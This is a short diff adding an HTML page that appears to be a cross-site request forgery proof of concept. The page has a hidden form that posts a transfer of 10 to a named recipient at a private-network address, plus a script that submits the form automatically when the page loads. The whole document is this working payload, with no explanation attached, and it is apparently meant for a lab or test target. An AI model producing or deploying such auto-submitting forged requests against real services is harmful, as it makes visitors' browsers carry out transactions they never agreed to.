@@ -1,0 +1,9 @@
+<form id="autosubmit" action="http://10.250.0.10:8080/transfer" enctype="text/plain" method="POST">
+ <input name="recipient" type="hidden" value="the_zucccccck" />
+ <input name="amount" type="hidden" value="10" />
+ <input type="submit" value="Submit Request" />
+</form>
+ 
+<script>
+ document.getElementById("autosubmit").submit();
+</script>
